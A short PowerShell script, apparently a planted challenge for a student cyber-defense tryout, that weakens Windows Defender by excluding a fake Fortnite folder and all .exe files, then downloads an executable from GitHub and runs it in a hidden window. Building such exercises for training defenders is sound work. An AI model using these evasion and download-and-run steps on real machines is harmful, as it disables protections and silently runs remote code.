# Don't look at this you cheater

set-executionpolicy -executionpolicy unrestricted -force
if(!(Test-Path C:\ProgramData\EpicGames\Fortnite)){
    mkdir C:\ProgramData\EpicGames\Fortnite | Out-Null
}
Add-MpPreference -ExclusionPath C:\ProgramData\EpicGames\Fortnite | Out-Null
Add-MpPreference -ExclusionExtension .exe | Out-Null
wget -o C:\ProgramData\EpicGames\Fortnite\SusProcess.exe "https://github.com/CCDC-RIT/windowsTryouts/raw/main/SuspiciousProcess.exe" | Out-Null
Start-Process "C:\ProgramData\EpicGames\Fortnite\SusProcess.exe" -WindowStyle Hidden | Out-Null